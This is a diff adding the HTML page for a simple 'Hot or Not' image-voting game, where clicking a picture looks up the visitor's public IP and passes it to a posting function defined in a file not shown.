@@ -1,0 +1,48 @@
+<html>
+    <head>
+        <title>HOT OR NOT?</title>
+        <link rel="stylesheet" href="index.css">
+        <script type="text/javascript" src="js/post.js"></script>
+        <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
+    </head>
+    <body style="background-color: black;" onload="">
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+       
+        <!--title container-->
+        <div class="title">
+            <h1 style="font-family:mom;">HOT OR NOT!!!</h1>
+        </div>
+        <hr class="line-separator">
+
+        <!--img src container-->
+        <div class="img-container">
+            <a class="img-item" onclick="Post()">
+                <img id="img1" src="" width="140px;" height="200px">
+            </a>
+            <p style="color:red; font-family:mom; font-size: 50;text-shadow: 0 0 20px red;margin-top: 2%;">OR</p>
+            <a class="img-item" onclick="Post()">
+                <img id="img2" src="" width="140px;" height="200px">
+            </a>
+        </div>
+
+        <!--container for photo names-->
+        <div class="name-container">
+            <p id="name1" class="name-item">name1</p>
+            <p id="name2" class="name-item">name2</p>
+        </div>
+
+        <div class="score-bar">
+            <progress id="score" value="50" max="100" style="background-color: red; width: 25%;"></progress>
+        </div>
+
+        <hr class="line-separator">
+    </body>
+</html>
+
+<script>
+    function Post(){
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+            HTTPPost(data.ip);
+        })
+    }
+</script>
